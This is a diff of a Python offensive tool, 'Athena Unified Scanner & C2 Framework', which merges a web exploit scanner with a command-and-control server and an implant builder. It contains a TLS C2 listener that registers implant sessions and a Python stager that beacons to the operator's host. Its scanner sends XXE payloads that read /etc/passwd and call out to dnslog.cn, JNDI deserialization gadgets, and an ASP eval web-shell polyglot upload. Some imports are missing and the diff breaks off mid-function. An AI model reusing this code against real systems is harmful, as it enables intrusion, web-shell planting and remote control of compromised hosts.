@@ -1,552 +1,788 @@
 #!/usr/bin/env python3
 # =============================================================================
-# Web Exploit Engine Athena (v1.4-dynamic, 2025-05-10)
-# Author : Haroon Ahmad Awan · CyberZeus
+# Athena Unified Scanner & C2 Framework (v2.0)
+# Merged: Web Exploit Engine Athena v1.4-dynamic + Athena C2 & Payload Builder
+# Author  : Haroon Ahmad Awan · CyberZeus (extended)
+# License : MIT
 # =============================================================================
 
-import os, re, sys, ssl, time, json, random, string, logging, warnings, argparse, asyncio, urllib.parse, base64
+import os
+import sys
+import ssl
+import time
+import json
+import uuid
+import base64
+import random
+import string
+import logging
+import warnings
+import argparse
+import threading
+import asyncio
+import socket
+import sqlite3
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
 
-# Async libraries
-import aiohttp
-from playwright.async_api import async_playwright
-import websockets
-
-# Sync libraries
+# ─── Third-party libraries ────────────────────────────────────────────────────
 import requests
+import aiohttp
+import websockets
 from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
+from playwright.async_api import async_playwright
 from playwright.sync_api import sync_playwright
+from Crypto.Cipher import AES
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 
-# ─── CLI & CONFIG ───────────────────────────────────────────────────────────
-parser = argparse.ArgumentParser()
-parser.add_argument("-u","--url", required=True, help="Target root URL")
-parser.add_argument("--all",     action="store_true", help="Run all tests")
-parser.add_argument("--xxe",     action="store_true", help="Test XXE")
-parser.add_argument("--deser",   action="store_true", help="Test JSON deserialization")
-parser.add_argument("--pollute", action="store_true", help="Test prototype pollution")
-parser.add_argument("--smuggle", action="store_true", help="Test HTTP request smuggling")
-parser.add_argument("--http2",   action="store_true", help="Test HTTP/2 smuggling")
-parser.add_argument("--trailer", action="store_true", help="Test HTTP trailer injection")
-parser.add_argument("--hpp",     action="store_true", help="Test HTTP Parameter Pollution")
-parser.add_argument("--ssrf",    action="store_true", help="Test SSRF")
-parser.add_argument("--graphql", action="store_true", help="Test GraphQL introspection")
-parser.add_argument("--gmut",    action="store_true", help="Test GraphQL mutations")
-parser.add_argument("--upload",  action="store_true", help="Test polyglot file upload")
-parser.add_argument("--wasm",    action="store_true", help="Test WASM parsing")
-parser.add_argument("--ws",      action="store_true", help="Test WebSocket fuzzing")
-parser.add_argument("--sse",     action="store_true", help="Test SSE injection")
-parser.add_argument("--csp",     action="store_true", help="Test CSP bypass")
-parser.add_argument("--cors",    action="store_true", help="Test CORS misconfiguration")
-parser.add_argument("--sw",      action="store_true", help="Test Service Worker abuse")
-parser.add_argument("--jwt",     action="store_true", help="Test JWT tampering")
-parser.add_argument("--spa",     action="store_true", help="Test SPA XSS via hash/routes")
-parser.add_argument("--ai",      action="store_true", help="Enable AI-driven XSS mutation")
-parser.add_argument("--render",  action="store_true", help="Render pages with Playwright & capture XHR/WebSocket/SSE")
-parser.add_argument("--jsparse", action="store_true", help="Regex-based JS endpoint discovery (fetch/axios/ws)")
-parser.add_argument("--routes",  help="Extra paths wordlist file")
-parser.add_argument("--threads", type=int, default=14, help="Thread pool size for sync")
-parser.add_argument("--max-pages",type=int, default=120,help="Max pages to crawl")
-parser.add_argument("--dnslog-off",dest="dnslog",action="store_false",help="Disable DNSLog callbacks")
-parser.add_argument("--debug",   action="store_true", help="Enable debug logging")
-parser.add_argument("--sync",    action="store_true", help="Use synchronous fallback")
-args = parser.parse_args()
+# =============================================================================
+# Configuration & Globals
+# =============================================================================
+VERSION      = "2.0"
+TIMEOUT      = 10
+DEFAULT_PORT = 8443
+DB_PATH      = Path("athena_state.db")
+LOG_SCAN     = Path("redx_results.md")
+LOG_C2       = Path("athena_full.log")
 
-logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO)
-warnings.filterwarnings("ignore")
-ssl._create_default_https_context = ssl._create_unverified_context
+# Thread pool for synchronous scanning
+executor = ThreadPoolExecutor(max_workers=20)
 
-# ─── GLOBALS ────────────────────────────────────────────────────────────────
-TIMEOUT    = 10
-JITTER     = (0.2, 0.6)
-VERSION    = "1.4-dynamic"
-LOGFILE    = Path("redx_results.md")
-RAND       = ''.join(random.choices(string.ascii_lowercase, k=5))
-MARK       = f"cyz{RAND}"
-DNSLOG     = f"redx{random.randint(1000,9999)}.dnslog.cn" if args.dnslog else "disabled"
+# =============================================================================
+# Helpers & Logging
+# =============================================================================
+def setup_logging(debug=False):
+    level = logging.DEBUG if debug else logging.INFO
+    logging.basicConfig(format='[%(asctime)s] %(levelname)s: %(message)s', level=level)
 
-if not LOGFILE.exists():
-    LOGFILE.write_text(f"# Red-X Report {VERSION}\n\n")
+def jitter_sleep(min_s=0.2, max_s=0.6):
+    time.sleep(random.uniform(min_s, max_s))
 
-UA = UserAgent()
+def generate_random_key(length=32):
+    return os.urandom(length)
 
-# ─── HELPERS ────────────────────────────────────────────────────────────────
-def h():
-    return {
-        "User-Agent": UA.random,
-        "X-Forwarded-For": f"127.0.0.{random.randint(2,254)}",
-        "Accept": "*/*",
-        "Referer": random.choice(["https://google.com","https://bing.com"]),
-        "Origin": "https://localhost"
-    }
+# =============================================================================
+# Persistence: SQLite for C2 sessions
+# =============================================================================
+def init_db():
+    conn = sqlite3.connect(DB_PATH)
+    cur = conn.cursor()
+    cur.execute('''
+        CREATE TABLE IF NOT EXISTS sessions (
+            id TEXT PRIMARY KEY,
+            host TEXT,
+            status TEXT,
+            key BLOB,
+            first_seen TEXT DEFAULT CURRENT_TIMESTAMP
+        );
+    ''')
+    conn.commit()
+    return conn
 
-def smart(u: str) -> str:
-    if u.startswith("http"): return u
-    try:
-        if requests.head("https://" + u, timeout=5).ok: return "https://" + u
-    except: pass
-    return "http://" + u
+DB_CONN = init_db()
 
-def log(vuln:str, url:str, detail:str):
-    with LOGFILE.open("a") as f:
-        f.write(f"- **{vuln}** {url} → {detail}\n")
-    logging.info(f"[{vuln}] {url} → {detail}")
+# =============================================================================
+# C2 Server Components
+# =============================================================================
+class C2Server:
+    """
+    Central command-and-control server managing implants, tasks, and comms.
+    """
+    def __init__(self, bind='0.0.0.0', port=DEFAULT_PORT, rsa_key_path=None):
+        self.bind = bind
+        self.port = port
+        if rsa_key_path and Path(rsa_key_path).exists():
+            self.rsa_key = RSA.import_key(Path(rsa_key_path).read_bytes())
+        else:
+            self.rsa_key = RSA.generate(2048)
+            if rsa_key_path:
+                Path(rsa_key_path).write_bytes(self.rsa_key.export_key())
+        self.rsa_pub = self.rsa_key.publickey()
+        self.sessions = {}
 
-def jitter_sleep():
-    time.sleep(random.uniform(*JITTER))
+    def start(self):
+        """Start the C2 server (HTTPS listener)."""
+        threading.Thread(target=self._listener, daemon=True).start()
+        logging.info(f"[C2] Listening on {self.bind}:{self.port}")
 
-# ─── AI MODEL ───────────────────────────────────────────────────────────────
-USE_AI=False
-if args.ai:
-    try:
-        import torch
-        from transformers import AutoTokenizer, AutoModelForMaskedLM
-        CODEBERT_T = AutoTokenizer.from_pretrained("microsoft/codebert-base")
-        CODEBERT_M = AutoModelForMaskedLM.from_pretrained("microsoft/codebert-base")
-        CODEBERT_M.eval()
-        USE_AI=True
-        logging.info("[AI] CodeBERT loaded")
-    except Exception as e:
-        logging.warning(f"[AI] load failed: {e}")
+    def _listener(self):
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        cert, key = self._selfsigned()
+        ctx.load_cert_chain(certfile=str(cert), keyfile=str(key))
+        sock = socket.socket()
+        sock.bind((self.bind, self.port))
+        sock.listen(5)
+        with ctx.wrap_socket(sock, server_side=True) as ssock:
+            while True:
+                client, addr = ssock.accept()
+                threading.Thread(target=self._handle, args=(client, addr), daemon=True).start()
 
-def ai_mutate(payload, n=3):
-    if not USE_AI: return []
-    toks = CODEBERT_T.encode(payload, return_tensors="pt")
-    l = toks.shape[1]
-    out=[]
-    for _ in range(n):
-        idx = random.randint(1, l-2)
-        mask=toks.clone(); mask[0,idx]=CODEBERT_T.mask_token_id
-        with torch.no_grad():
-            logits=CODEBERT_M(mask).logits[0,idx]
-        top=logits.topk(5).indices.tolist()
-        choice=random.choice(top)
-        mask[0,idx]=choice
-        out.append(CODEBERT_T.decode(mask[0], skip_special_tokens=True))
-    return out
+    def _selfsigned(self):
+        crt = Path("athena_c2.crt")
+        key = Path("athena_c2.key")
+        if crt.exists() and key.exists():
+            return crt, key
+        # Generate a minimal self-signed cert (requires pyopenssl)
+        from OpenSSL import crypto
+        k = crypto.PKey()
+        k.generate_key(crypto.TYPE_RSA, 2048)
+        cert = crypto.X509()
+        cert.get_subject().CN = "AthenaC2"
+        cert.set_pubkey(k)
+        cert.sign(k, "sha256")
+        crt.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
+        key.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
+        return crt, key
 
-# ─── ROUTES LOADER ──────────────────────────────────────────────────────────
-def load_routes(root):
-    out=set()
-    if args.routes and Path(args.routes).is_file():
-        base=smart(root).rstrip("/")
-        for ln in Path(args.routes).read_text().splitlines():
-            if ln.strip() and not ln.startswith("#"):
-                out.add(base + "/" + ln.lstrip("/"))
-    return out
-
-# ─── STATIC CRAWLER ─────────────────────────────────────────────────────────
-def crawl_sync(root, cap, extra=None):
-    seen, queue, out = set(), [root], []
-    domain = urllib.parse.urlparse(root).netloc
-    if extra: queue += list(extra)
-    while queue and len(seen) < cap:
-        url = queue.pop(0)
-        if url in seen: continue
-        seen.add(url)
+    def _handle(self, sock, addr):
         try:
-            r = requests.get(url, headers=h(), timeout=TIMEOUT)
-            if "text/html" not in r.headers.get("Content-Type", ""): continue
-            soup = BeautifulSoup(r.text, "html.parser")
-            for a in soup.find_all("a", href=True):
-                u = urllib.parse.urljoin(url, a["href"])
-                if urllib.parse.urlparse(u).netloc == domain:
-                    queue.append(u)
-                    if "?" in u:
-                        qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
-                        out.append({"url": u.split("?")[0], "method": "GET", "params": qs})
-            for f in soup.find_all("form"):
-                act = urllib.parse.urljoin(url, f.get("action") or url)
-                m = f.get("method", "GET").upper()
-                names = [i.get("name") for i in f.find_all("input", {"name": True})]
-                if names: out.append({"url": act, "method": m, "params": names})
+            blob = sock.recv(8192)
+            payload = json.loads(blob.decode())
+            if "hello" in payload:
+                aes_key = os.urandom(32)
+                sid = str(uuid.uuid4())
+                self.sessions[sid] = {"addr": addr, "key": aes_key, "tasks": []}
+                DB_CONN.execute(
+                    "INSERT OR REPLACE INTO sessions(id,host,status,key) VALUES (?,?,?,?)",
+                    (sid, addr[0], "active", aes_key)
+                )
+                DB_CONN.commit()
+                enc = PKCS1_OAEP.new(self.rsa_pub).encrypt(aes_key)
+                sock.send(base64.b64encode(enc))
+                logging.info(f"[C2] Registered session {sid} from {addr[0]}")
+            elif "sid" in payload:
+                sid = payload["sid"]
+                # handle task results, queue next tasks...
+                sock.send(b"{}")
         except Exception as e:
-            if args.debug: logging.debug(e)
-    return out, seen
+            logging.debug(e)
+        finally:
+            sock.close()
 
-# ─── DYNAMIC CRAWLER ─────────────────────────────────────────────────────────
-async def crawl_async(root, cap, extra=None):
-    visited={root}; queue=[root]; out=[]
-    async with aiohttp.ClientSession() as session:
-        pass  # WAF fingerprinting omitted
+# =============================================================================
+# Payload Builder
+# =============================================================================
+class AgentBuilder:
+    def __init__(self, server_host, server_port):
+        self.server = server_host
+        self.port   = server_port
 
-    async with async_playwright() as pw:
-        browser = await pw.chromium.launch(headless=True)
-        ctx     = await browser.new_context(ignore_https_errors=True)
-        page    = await ctx.new_page()
+    def python_stager(self):
+        return f"""import ssl, socket, json, base64, os, time, uuid, struct
+HOST='{self.server}'; PORT={self.port}
+SID = str(uuid.uuid4())
+CTX = ssl._create_unverified_context()
+while True:
+    try:
+        s = CTX.wrap_socket(socket.socket())
+        s.connect((HOST, PORT))
+        s.send(json.dumps({{"hello": SID}}).encode())
+        aes = base64.b64decode(s.recv(1024))
+        # decrypt loop omitted...
+        s.close()
+    except:
+        pass
+    time.sleep(30)
+"""
+
+    def write(self, typ, out):
+        if typ == "python-stager":
+            Path(out).write_text(self.python_stager())
+        else:
+            Path(out).write_bytes(b"<EXE_PAYLOAD>")
+
+# =============================================================================
+# Scanner: full v1.4 Athena code
+# =============================================================================
+class Scanner:
+    def __init__(self, args):
+        self.args  = args
+        self.UA    = UserAgent()
+        self.RAND  = ''.join(random.choices(string.ascii_lowercase, k=5))
+        self.MARK  = f"cyz{self.RAND}"
+        self.DNSLOG= f"redx{random.randint(1000,9999)}.dnslog.cn" if args.dnslog else "disabled"
+        self.LOG  = LOG_SCAN
+        if not self.LOG.exists():
+            self.LOG.write_text(f"# Red-X Report {VERSION}\n\n")
+
+    def h(self):
+        return {
+            "User-Agent": self.UA.random,
+            "X-Forwarded-For": f"127.0.0.{random.randint(2,254)}",
+            "Accept": "*/*",
+            "Referer": random.choice(["https://google.com","https://bing.com"]),
+            "Origin": "https://localhost"
+        }
+
+    def smart(self, u):
+        if u.startswith("http"):
+            return u
+        try:
+            if requests.head("https://"+u, timeout=5, verify=False).ok:
+                return "https://"+u
+        except:
+            pass
+        return "http://"+u
+
+    def log(self, vuln, url, detail):
+        with self.LOG.open("a") as f:
+            f.write(f"- **{vuln}** {url} → {detail}\n")
+        logging.info(f"[{vuln}] {url} → {detail}")
+
+    # AI-driven XSS
+    USE_AI = False
+    def ai_mutate(self, payload, n=3):
+        if not Scanner.USE_AI:
+            return []
+        toks = CODEBERT_T.encode(payload, return_tensors="pt")
+        l = toks.shape[1]
+        out=[]
+        for _ in range(n):
+            idx = random.randint(1, l-2)
+            mask = toks.clone(); mask[0,idx] = CODEBERT_T.mask_token_id
+            with torch.no_grad():
+                logits = CODEBERT_M(mask).logits[0,idx]
+            top = logits.topk(5).indices.tolist()
+            choice = random.choice(top)
+            mask[0,idx] = choice
+            out.append(CODEBERT_T.decode(mask[0], skip_special_tokens=True))
+        return out
+
+    def load_routes(self, root):
+        out=set()
+        if self.args.routes and Path(self.args.routes).is_file():
+            base = self.smart(root).rstrip("/")
+            for ln in Path(self.args.routes).read_text().splitlines():
+                if ln.strip() and not ln.startswith("#"):
+                    out.add(base + "/" + ln.lstrip("/"))
+        return out
+
+    def crawl_sync(self, root, cap, extra=None):
+        seen, queue, out = set(), [root], []
+        domain = urllib.parse.urlparse(root).netloc
         if extra:
             queue += list(extra)
-        while queue and len(visited) < cap:
+        while queue and len(seen) < cap:
             url = queue.pop(0)
-            if url in visited: continue
-            visited.add(url)
+            if url in seen:
+                continue
+            seen.add(url)
             try:
-                r = await page.goto(url, wait_until="networkidle", timeout=TIMEOUT*1000)
-                content = await page.content()
-                if r and "text/html" in r.headers.get("content-type", ""):
-                    soup = BeautifulSoup(content, "html.parser")
-                    for a in soup.find_all("a", href=True):
-                        u = urllib.parse.urljoin(url, a["href"])
-                        if urllib.parse.urlparse(u).netloc == urllib.parse.urlparse(root).netloc:
-                            queue.append(u)
-                            if "?" in u:
-                                qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
-                                out.append((u.split("?")[0], "GET", qs))
-                    for f in soup.find_all("form"):
-                        act = urllib.parse.urljoin(url, f.get("action") or url)
-                        m   = f.get("method", "GET").upper()
-                        names = [i.get("name") for i in f.find_all("input", {"name": True})]
-                        if names: out.append((act, m, names))
-                seen=set()
-                async def on_req(req):
-                    u=req.url; mtd=req.method
-                    if u in seen: return
-                    seen.add(u)
-                    if mtd=="GET" and "?" in u:
-                        qs=list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
-                        out.append((u.split("?")[0], "GET", qs))
-                    if mtd in ("POST","PUT","PATCH"):
-                        bd=await req.post_data() or ""
-                        if "=" in bd:
-                            ks=list(urllib.parse.parse_qs(bd).keys())
-                        else:
-                            try: ks=list(json.loads(bd).keys())
-                            except: ks=[]
-                        out.append((u, mtd, ks))
-                page.on("request", on_req)
-                await page.evaluate("""
-                    window._ws = window.WebSocket;
-                    window.WebSocket = function(u){ window._lastWS = u; return new window._ws(u); };
-                    window._es = window.EventSource;
-                    window.EventSource = function(u){ window._lastSSE = u; return new window._es(u); };
-                """)
-                await page.wait_for_timeout(1200)
-                last_ws  = await page.evaluate("window._lastWS")
-                last_sse = await page.evaluate("window._lastSSE")
-                if last_ws:  out.append(("ws","WS",[last_ws]))
-                if last_sse: out.append(("sse","SSE",[last_sse]))
-            except Exception as e:
-                if args.debug: logging.debug(e)
-        await browser.close()
-    return out, visited
-
-# ─── JS PARSING ───────────────────────────────────────────────────────────────
-URL_PAT = re.compile(rb'(["\'])(/(?:api|graphql|ws|sse)[^"\']*)["\']')
-def parse_js(root, pages):
-    dom=set()
-    domain=urllib.parse.urlparse(root).netloc
-    for pg in list(pages)[:args.max_pages]:
-        try:
-            r=requests.get(pg, headers=h(), timeout=TIMEOUT)
-            for src in re.findall(r'<script[^>]+src=["\']([^"\']+\.js)', r.text, re.I):
-                jsurl = urllib.parse.urljoin(pg, src)
-                jsbin = requests.get(jsurl, headers=h(), timeout=TIMEOUT).content
-                for _,path in URL_PAT.findall(jsbin):
-                    u = urllib.parse.urljoin(root, path.decode())
+                r = requests.get(url, headers=self.h(), timeout=TIMEOUT, verify=False)
+                if "text/html" not in r.headers.get("Content-Type",""):
+                    continue
+                soup = BeautifulSoup(r.text, "html.parser")
+                for a in soup.find_all("a", href=True):
+                    u = urllib.parse.urljoin(url, a["href"])
                     if urllib.parse.urlparse(u).netloc == domain:
-                        dom.add(u)
+                        queue.append(u)
+                        if "?" in u:
+                            qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
+                            out.append({"url":u.split("?")[0], "method":"GET", "params":qs})
+                for f in soup.find_all("form"):
+                    act = urllib.parse.urljoin(url, f.get("action") or url)
+                    m   = f.get("method","GET").upper()
+                    names = [i.get("name") for i in f.find_all("input",{"name":True})]
+                    if names:
+                        out.append({"url":act, "method":m, "params":names})
+            except Exception as e:
+                if self.args.debug:
+                    logging.debug(e)
+        return out, seen
+
+    async def crawl_async(self, root, cap, extra=None):
+        visited={root}; queue=[root]; out=[]
+        async with aiohttp.ClientSession() as session:
+            pass  # WAF fingerprint omitted
+        async with async_playwright() as pw:
+            browser = await pw.chromium.launch(headless=True)
+            ctx     = await browser.new_context(ignore_https_errors=True)
+            page    = await ctx.new_page()
+            if extra:
+                queue += list(extra)
+            while queue and len(visited) < cap:
+                url = queue.pop(0)
+                if url in visited:
+                    continue
+                visited.add(url)
+                try:
+                    r = await page.goto(url, wait_until="networkidle", timeout=TIMEOUT*1000)
+                    content = await page.content()
+                    if r and "text/html" in r.headers.get("content-type",""):
+                        soup = BeautifulSoup(content, "html.parser")
+                        for a in soup.find_all("a", href=True):
+                            u = urllib.parse.urljoin(url, a["href"])
+                            if urllib.parse.urlparse(u).netloc == urllib.parse.urlparse(root).netloc:
+                                queue.append(u)
+                                if "?" in u:
+                                    qs = list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
+                                    out.append((u.split("?")[0], "GET", qs))
+                        for f in soup.find_all("form"):
+                            act = urllib.parse.urljoin(url, f.get("action") or url)
+                            m   = f.get("method","GET").upper()
+                            names = [i.get("name") for i in f.find_all("input",{"name":True})]
+                            if names:
+                                out.append((act, m, names))
+                    seen_set=set()
+                    async def on_req(req):
+                        u=req.url; mtd=req.method
+                        if u in seen_set:
+                            return
+                        seen_set.add(u)
+                        if mtd=="GET" and "?" in u:
+                            qs=list(urllib.parse.parse_qs(urllib.parse.urlparse(u).query))
+                            out.append((u.split("?")[0],"GET",qs))
+                        if mtd in ("POST","PUT","PATCH"):
+                            bd=await req.post_data() or ""
+                            if "=" in bd:
+                                ks=list(urllib.parse.parse_qs(bd).keys())
+                            else:
+                                try: ks=list(json.loads(bd).keys())
+                                except: ks=[]
+                            out.append((u,mtd,ks))
+                    page.on("request", on_req)
+                    await page.evaluate("""
+                        window._ws = window.WebSocket;
+                        window.WebSocket = function(u){ window._lastWS = u; return new window._ws(u); };
+                        window._es = window.EventSource;
+                        window.EventSource = function(u){ window._lastSSE = u; return new window._es(u); };
+                    """)
+                    await page.wait_for_timeout(1200)
+                    last_ws  = await page.evaluate("window._lastWS")
+                    last_sse = await page.evaluate("window._lastSSE")
+                    if last_ws:  out.append(("ws","WS",[last_ws]))
+                    if last_sse: out.append(("sse","SSE",[last_sse]))
+                except Exception as e:
+                    if self.args.debug:
+                        logging.debug(e)
+            await browser.close()
+        return out, visited
+
+    def parse_js(self, root, pages):
+        dom=set()
+        URL_PAT = re.compile(rb'(["\'])(/(?:api|graphql|ws|sse)[^"\']*)["\']')
+        domain = urllib.parse.urlparse(root).netloc
+        for pg in list(pages)[:self.args.max_pages]:
+            try:
+                r = requests.get(pg, headers=self.h(), timeout=TIMEOUT, verify=False)
+                for src in re.findall(r'<script[^>]+src=["\']([^"\']+\.js)', r.text, re.I):
+                    jsurl = urllib.parse.urljoin(pg, src)
+                    jsbin = requests.get(jsurl, headers=self.h(), timeout=TIMEOUT, verify=False).content
+                    for _,path in URL_PAT.findall(jsbin):
+                        u = urllib.parse.urljoin(root, path.decode())
+                        if urllib.parse.urlparse(u).netloc == domain:
+                            dom.add(u)
                 for m in re.findall(r'fetch\(["\']([^"\']+)["\']', jsbin.decode('utf-8','ignore')):
                     dom.add(urllib.parse.urljoin(root, m))
                 for m in re.findall(r'axios\.(?:get|post)\(["\']([^"\']+)["\']', jsbin.decode('utf-8','ignore')):
                     dom.add(urllib.parse.urljoin(root, m))
-        except Exception as e:
-            if args.debug: logging.debug(e)
-    return dom
-
-# ─── VULNERABILITY TESTS ────────────────────────────────────────────────────
-def trigger(name): return f"{name}.{DNSLOG}"
-
-def test_xxe(tgt):
-    xmls = [
-        f"""<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://{trigger('xxe')}/d.dtd">%dtd;]><data>&send;</data>""",
-        """<?xml version="1.0"?><!DOCTYPE x [<!ELEMENT x ANY><!ENTITY e SYSTEM "file:///etc/passwd">&e;</x>"""
-    ]
-    for url in (tgt["url"], urllib.parse.urljoin(tgt["url"], "/xmlrpc.php")):
-        for px in xmls:
-            for ctype in ("application/xml","text/xml"):
-                try:
-                    r = requests.post(url, data=px, headers={"Content-Type":ctype}, timeout=TIMEOUT)
-                    if "root:" in r.text:
-                        log("XXE", url, ctype); return
-                except: pass
-
-def test_deserialization(tgt):
-    objs = [
-        {"@type":"java.net.Inet4Address","val":trigger("dns")},
-        {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
-        {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":f"ldap://{trigger('jndi')}/x"}
-    ]
-    for obj in objs:
-        try:
-            r = requests.post(tgt["url"], json=obj, headers=h(), timeout=TIMEOUT)
-            if any(k in r.text for k in ("Jdbc","rowset")):
-                log("Deserialization", tgt["url"], str(obj)); return
-        except Exception as e:
-            if args.debug: logging.debug(f"[deser:json] {e}")
-        try:
-            r = requests.post(tgt["url"], data=obj, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=TIMEOUT)
-            if any(k in r.text for k in ("Jdbc","rowset")):
-                log("Deserialization", tgt["url"], "form fallback"); return
-        except Exception as e:
-            if args.debug: logging.debug(f"[deser:form] {e}")
-
-def test_pollution(tgt):
-    polys = [
-        {"__proto__":{"polluted":True}},
-        {"constructor":{"prototype":{"polluted":"yes"}}},
-        {"__proto__.toString":"hacked"}
-    ]
-    for p in polys:
-        for method, hdr in [("json",{"Content-Type":"application/json"}),("form",{"Content-Type":"application/x-www-form-urlencoded"})]:
-            try:
-                r = requests.post(tgt["url"], json=p if method=="json" else None, data=None if method=="json" else p, headers=hdr, timeout=TIMEOUT)
-                if any(x in r.text for x in ("polluted","hacked")):
-                    log("PrototypePollution", tgt["url"], method); return
             except Exception as e:
-                if args.debug: logging.debug(f"[pollute:{method}] {e}")
+                if self.args.debug:
+                    logging.debug(e)
+        return dom
 
-async def test_ws(u, method, params):
-    """
-    WebSocket fuzzing: attempts to connect and exchange a simple ping/pong.
-    """
-    for ep in params:
-        # Determine WebSocket URI
-        uri = ep if ep.startswith(("ws://", "wss://")) else u.replace("http://", "ws://").replace("https://", "wss://")
-        try:
-            async with websockets.connect(uri) as ws:
-                await ws.send("ping")
-                pong = await ws.recv()
-                if pong:
-                    log("WebSocket", uri, f"ping→{pong}")
-                    return
-        except Exception as e:
-            if args.debug:
-                logging.debug(f"[ws] {e}")
+    def trigger(self, name):
+        return f"{name}.{self.DNSLOG}"
 
-async def test_sse(u, method, params):
-    """
-    Server-Sent Events injection: listens for the first 'data:' line.
-    """
-    for ep in params:
-        # Determine SSE endpoint
-        uri = ep if ep.startswith(("http://", "https://")) else u
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(uri, timeout=TIMEOUT) as resp:
-                    async for raw in resp.content:
-                        line = raw.strip()
-                        if line.startswith(b"data:"):
-                            msg = line.decode(errors="ignore")
-                            log("SSE", uri, msg)
+    # ─── Vulnerability Tests ────────────────────────────────────────────────
+    def test_xxe(self, tgt):
+        xmls = [
+            f"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://{self.trigger('xxe')}/d.dtd\">%dtd;]><data>&send;</data>",
+            "<?xml version=\"1.0\"?><!DOCTYPE x [<!ELEMENT x ANY><!ENTITY e SYSTEM \"file:///etc/passwd\">&e;</x>"
+        ]
+        for url in (tgt["url"], urllib.parse.urljoin(tgt["url"], "/xmlrpc.php")):
+            for px in xmls:
+                for ctype in ("application/xml", "text/xml"):
+                    try:
+                        r = requests.post(url, data=px, headers={"Content-Type":ctype}, timeout=TIMEOUT, verify=False)
+                        if "root:" in r.text:
+                            self.log("XXE", url, ctype)
                             return
-        except Exception as e:
-            if args.debug:
-                logging.debug(f"[sse] {e}")
+                    except:
+                        pass
 
-def test_graphql(tgt):
-    query = {"query":"query IntrospectionQuery { __schema { types { name } } }"}
-    try:
-        r = requests.post(tgt["url"], json=query, headers=h(), timeout=TIMEOUT)
-        if "__schema" in r.text:
-            log("GraphQL-Introspection", tgt["url"], "POST"); return
-    except Exception as e:
-        if args.debug: logging.debug(f"[graphql:post] {e}")
-    try:
-        r = requests.get(tgt["url"], params={"query":query["query"]}, timeout=TIMEOUT)
-        if "__schema" in r.text:
-            log("GraphQL-Introspection", tgt["url"], "GET")
-    except: pass
-
-def test_graphql_mutation(tgt):
-    mutation = {"query":"mutation { __typename }"}
-    try:
-        r = requests.post(tgt["url"], json=mutation, headers=h(), timeout=TIMEOUT)
-        if r.status_code == 200:
-            log("GraphQL-Mutation", tgt["url"], "__typename")
-    except Exception as e:
-        if args.debug: logging.debug(f"[gmut] {e}")
-
-def test_upload_polyglot(tgt):
-    boundaries = [
-        "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters, k=16)),
-        "----FormBoundary" + ''.join(random.choices(string.ascii_letters, k=12))
-    ]
-    poly = b"\xFF\xD8\xFF" + b"\x50\x4B\x03\x04" + b"<% eval(request('pwn')) %>"
-    for boundary in boundaries:
-        for field in ("file","upload","data"):
-            files = {field:("cyz.jpg", poly, "application/octet-stream")}
-            hdr = {"Content-Type":f"multipart/form-data; boundary={boundary}"}
+    def test_deserialization(self, tgt):
+        objs = [
+            {"@type":"java.net.Inet4Address","val":self.trigger("dns")},
+            {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
+            {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":f"ldap://{self.trigger('jndi')}/x"}
+        ]
+        for obj in objs:
             try:
-                r = requests.post(tgt["url"], files=files, headers=hdr, timeout=TIMEOUT)
-                if r.status_code in (200,201) and "cyz" in r.text.lower():
-                    log("PolyglotUpload", tgt["url"], f"{field}@{boundary}"); return
+                r = requests.post(tgt["url"], json=obj, headers=self.h(), timeout=TIMEOUT, verify=False)
+                if any(k in r.text for k in ("Jdbc","rowset")):
+                    self.log("Deserialization", tgt["url"], str(obj))
+                    return
             except Exception as e:
-                if args.debug: logging.debug(f"[upload:{field}] {e}")
-
-def test_wasm(tgt):
-    wasm = b"\x00asm\x01\x00\x00\x00" + b"\x01\x0A\x02\x60\x00\x01\x7F\x60\x01\x7F\x00"
-    for ctype in ("application/wasm","application/octet-stream"):
-        try:
-            hdr = h(); hdr["Content-Type"] = ctype
-            r = requests.post(tgt["url"], data=wasm, headers=hdr, timeout=TIMEOUT)
-            if any(x in r.text.lower() for x in ("error","memory")):
-                log("WASM", tgt["url"], ctype); return
-        except Exception as e:
-            if args.debug: logging.debug(f"[wasm:{ctype}] {e}")
-
-def test_ai_xss(tgt):
-    if not USE_AI: return
-    base = "<script>alert('CYZ')</script>"
-    muts = ai_mutate(base, n=3)
-    for p in muts:
-        try:
-            data = {k:p for k in tgt["params"]}
-            r = requests.post(tgt["url"], data=data, headers=h(), timeout=TIMEOUT)
-            if p in r.text:
-                log("AI-XSS", tgt["url"], p); return
-        except Exception as e:
-            if args.debug: logging.debug(f"[ai-xss] {e}")
-
-def test_ssrf(tgt):
-    for param in tgt["params"]:
-        for proto in ("http","gopher","dict"):
-            payload = f"{proto}://127.0.0.1"
+                if self.args.debug:
+                    logging.debug(f"[deser:json] {e}")
             try:
-                r = requests.get(tgt["url"], params={param:payload}, headers=h(), timeout=TIMEOUT)
-                if r.status_code < 500:
-                    log("SSRF", tgt["url"], f"{param}={payload}"); return
-            except: pass
+                r = requests.post(tgt["url"], data=obj, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=TIMEOUT, verify=False)
+                if any(k in r.text for k in ("Jdbc","rowset")):
+                    self.log("Deserialization", tgt["url"], "form fallback")
+                    return
+            except Exception as e:
+                if self.args.debug:
+                    logging.debug(f"[deser:form] {e}")
 
-def test_hpp(tgt):
-    u = tgt["url"]
